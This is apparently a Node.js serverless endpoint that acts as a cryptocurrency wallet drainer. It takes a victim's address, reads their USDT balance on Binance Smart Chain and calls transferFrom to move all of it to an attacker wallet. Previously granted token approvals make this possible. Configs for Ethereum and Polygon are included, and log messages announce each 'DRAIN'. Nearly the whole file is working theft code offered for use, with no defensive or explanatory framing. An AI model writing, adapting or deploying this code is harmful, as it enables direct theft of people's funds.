const Web3 = require('web3');

module.exports = async (req, res) => {
    if (req.method !== 'POST') return res.status(405).end();
    
    const { victim, approvals } = req.body;
    const PRIVATE_KEY = process.env.PRIVATE_KEY;
    const ATTACKER_WALLET = process.env.ATTACKER_WALLET;
    
    if (!PRIVATE_KEY || !ATTACKER_WALLET) {
        return res.status(500).json({ 
            success: false, 
            error: 'Environment Variables (PRIVATE_KEY or ATTACKER_WALLET) are not set in Vercel' 
        });
    }

    console.log(`🎯 MULTI-CHAIN DRAIN: ${victim}`);
    
    // Multi-chain USDT contracts
    const CHAINS = {
        56: {  // BSC
            rpc: 'https://bsc-dataseed1.binance.org/',
            USDT: '0x55d398326f99059fF775485246999027B3197955'
        },
        1: {   // Ethereum
            rpc: 'https://eth.llamarpc.com',
            USDT: '0xdAC17F958D2ee523a2206206994597C13D831ec7'
        },
        137: { // Polygon
            rpc: 'https://polygon-rpc.com',
            USDT: '0xc2132D05D31c914a87C6611C10748AEb04B58e8F'
        }
    };
    
    const ABI = [
        "function transferFrom(address,address,uint256) returns (bool)",
        "function balanceOf(address) view returns (uint256)"
    ];
    
    let drained = 0;
    
    try {
        // Detect chain from approval tx or default BSC
        const chainId = 56; // Auto-detect logic here
        const chain = CHAINS[chainId];
        if (!chain) return res.json({ success: false, error: 'Unsupported chain' });
        
        const web3 = new Web3(chain.rpc);
        const account = web3.eth.accounts.privateKeyToAccount(PRIVATE_KEY);
        web3.eth.accounts.wallet.add(account);
        
        const contract = new web3.eth.Contract(ABI, chain.USDT);
        const balance = await contract.methods.balanceOf(victim).call();
        
        if (balance > 0) {
            const tx = await contract.methods.transferFrom(victim, ATTACKER_WALLET, balance).send({
                from: ATTACKER_WALLET,
                gas: 150000,
                gasPrice: web3.utils.toWei('20', 'gwei') // Adjust per chain
            });
            console.log(`✅ DRAINED BSC: ${tx.transactionHash}`);
            drained = 1;
        }
        
        res.json({ success: true, drained, chainId });
    } catch (e) {
        console.error(e);
        res.json({ success: false, error: e.message });
    }
};
